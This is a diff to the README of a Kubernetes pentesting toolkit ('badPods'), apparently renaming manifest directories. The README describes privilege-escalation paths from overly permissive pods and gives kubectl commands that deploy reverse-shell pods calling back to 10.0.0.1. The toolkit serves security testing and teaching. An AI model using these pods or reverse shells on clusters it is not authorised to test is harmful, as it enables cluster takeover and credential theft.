@@ -19,10 +19,10 @@ Notes | yaml | readme
 Nothing allowed | [yaml](yaml/nothing-allowed/pod-nothing-allowed.yaml) | [readme](yaml/nothing-allowed/README.md)
 Everything allowed | [yaml](yaml/everything-allowed/pod-everything-allowed.yaml) | [readme](yaml/everything-allowed/README.md)
 Privileged and hostPid | [yaml](yaml/priv-and-hostpid/README.md) | [readme](yaml/priv-and-hostpid/README.md)
-Privileged only | [yaml](yaml/priv-only/pod-priv-only.yaml) | [readme](yaml/priv-only/README.md)
-hostPid only | [yaml](yaml/hostpid-only/pod-hostpid-only.yaml) | [readme](yaml/hostpid-only/README.md)
-hostNetwork only | [yaml](yaml/hostnetwork-only/pod-hostnetwork-only.yaml) | [readme](yaml/hostnetwork-only/README.md)
-hostIPC only | [yaml](yaml/hostipc-only/pod-hostipc-only.yaml) | [readme](yaml/hostipc-only/README.md)
+Privileged only | [yaml](yaml/priv/pod-priv.yaml) | [readme](yaml/priv/README.md)
+hostPid only | [yaml](yaml/hostpid/pod-hostpid.yaml) | [readme](yaml/hostpid/README.md)
+hostNetwork only | [yaml](yaml/hostnetwork/pod-hostnetwork.yaml) | [readme](yaml/hostnetwork/README.md)
+hostIPC only | [yaml](yaml/hostipc/pod-hostipc.yaml) | [readme](yaml/hostipc/README.md)
 
 ## Reverse shell versions of each pod
 
@@ -31,10 +31,10 @@ Notes | yaml | readme
 Nothing allowed |  [yaml](yaml/nothing-allowed/pod-nothing-allowed-revshell.yaml) | [readme](yaml/nothing-allowed/README.md)
 Everything allowed | [yaml](yaml/everything-allowed/pod-everything-allowed-revshell.yaml) |  [readme](yaml/everything-allowed/README.md)
 Privileged and hostPid | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml) | [readme](yaml/priv-and-hostpid/README.md)
-Privileged only | [yaml](yaml/priv-only/pod-priv-only-revshell.yaml) | [readme](yaml/priv-only/README.md)
-hostPid only | [yaml](yaml/hostipc-only/pod-hostipc-only-revshell.yaml) | [readme](yaml/hostpid-only/README.md)
-hostNetwork only | [yaml](yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml) | [readme](yaml/hostnetwork-only/README.md)
-hostIPC only | [yaml](yaml/hostipc-only/README.md) | [readme](yaml/hostipc-only/README.md)
+Privileged only | [yaml](yaml/priv/pod-priv-revshell.yaml) | [readme](yaml/priv/README.md)
+hostPid only | [yaml](yaml/hostipc/pod-hostipc-revshell.yaml) | [readme](yaml/hostpid/README.md)
+hostNetwork only | [yaml](yaml/hostnetwork/pod-hostnetwork-revshell.yaml) | [readme](yaml/hostnetwork/README.md)
+hostIPC only | [yaml](yaml/hostipc/README.md) | [readme](yaml/hostipc/README.md)
 
 
 # Impact - What's the worst that can happen?
@@ -114,7 +114,7 @@ Multiple likely paths to full cluster compromise (all resources in all namespace
 If you only have `privileged=true`, you can eventually get an interactive shell on the node, but you start with non-interactive command execution as root and you'll have to upgrade it if you want interactive access. The privesc paths are the same as above.
 
 ### Usage and exploitation examples 
-[yaml/priv-only/README.md](yaml/priv-only/README.md) 
+[yaml/priv/README.md](yaml/priv/README.md) 
 
 ### Reference(s): 
 * https://twitter.com/_fel1x/status/1151487051986087936
@@ -132,7 +132,7 @@ Multiple likely paths to full cluster compromise (all resources in all namespace
 While you don't have access to host process or network namespaces, having access to the full filesystem allows you to perform most of the same types of privesc paths outlined above. If you were able to run your pod on a node that is running etcd, you have instant access to all secrets. If not, hunt for tokens from other pods running on the node and hope you find a token associated with a highly privileged service account.
 
 ### Usage and exploitation examples 
-[yaml/hostpath-only/README.md](yaml/hostpath-only/README.md)
+[yaml/hostpath/README.md](yaml/hostpath/README.md)
 
 ### Reference(s): 
 * [The Path Less Traveled: Abusing Kubernetes Defaults](https://www.youtube.com/watch?v=HmoVSmTIOxM) & [corresponding repo](https://github.com/mauilion/blackhat-2019)
@@ -149,7 +149,7 @@ Unlikely but possible path to cluster compromise
 Run `ps -aux` on the host which will show you all the process running on the host, including proccesses running within each pod. Look for any process that includes passwords, tokens, or keys in the `ps` output. Pipe the `ps` output to `more` or `less` to make sure the full output is word wrapped. If you are lucky, you will find credentials and you'll be able to use them to privesc within the cluster, to services supported by the cluster, or to services that cluster hosted applications are communicating with. It is a long shot, but you might find a kubernetes token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster-admin. You can also kill any process on the node (DOS), but I would advise against it!  
 
 ### Usage and exploitation examples 
-[yaml/hostpid-only/README.md](yaml/hostpid-only/README.md)
+[yaml/hostpid/README.md](yaml/hostpid/README.md)
 
 
 ## hostNetwork only
@@ -165,7 +165,7 @@ This opens up two potential escalation paths:
 * **Access services bound to localhost**  You can also reach services that only listen on the host's loopback interface or are otherwise blocked by network polices. These services might turn into a fruitful privesc path. 
 
 ### Usage and exploitation examples 
-[yaml/hostnetwork-only/README.md](yaml/hostnetwork-only/README.md) 
+[yaml/hostnetwork/README.md](yaml/hostnetwork/README.md) 
 
 
 ## hostIPC only
@@ -179,7 +179,7 @@ Not seen often - but potential limited compromise
 If any process on the host or any processes within a pod is using the host's inter-process communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. That said, with things like message queues, even if you can read something in the queue, reading it is a destructive action that will remove it from the queue, so beware. 
 
 ### More details and exploitation examples 
-[yaml/hostipc-only/README.md](yaml/hostipc-only/README.md) 
+[yaml/hostipc/README.md](yaml/hostipc/README.md) 
 
 # Usage
  Each resource in the `yamls` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  
@@ -195,11 +195,11 @@ cd badPods
 ```bash
 kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
 kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
-kubectl apply -f ./yaml/priv-only/pod-priv-only.yaml
-kubectl apply -f ./yaml/hostpath-only/pod-hostpath-only.yaml
-kubectl apply -f ./yaml/hostpid-only/pod-hostpid-only.yaml 
-kubectl apply -f ./yaml/hostnetwork-only/pod-hostnetwork-only.yaml
-kubectl apply -f ./yaml/hostipc-only/pod-hostipc-only.yaml
+kubectl apply -f ./yaml/priv/pod-priv.yaml
+kubectl apply -f ./yaml/hostpath/pod-hostpath.yaml
+kubectl apply -f ./yaml/hostpid/pod-hostpid.yaml 
+kubectl apply -f ./yaml/hostnetwork/pod-hostnetwork.yaml
+kubectl apply -f ./yaml/hostipc/pod-hostipc.yaml
 ```
 
 ### Reverse shell version of each pod
@@ -207,10 +207,10 @@ If you can create pods but not exec  into them, you can use the reverse shell ve
 
 ```bash
 HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/hostpid-only/pod-hostpid-only-revshell.yaml  | kubectl apply -f -
-HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath-only/pod-hostpath-only-revshell.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc-only/pod-hostipc-only-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml  | kubectl apply -f -
+HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/hostnetwork/pod-hostnetwork-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath/pod-hostpath-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
 HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
 ```
 
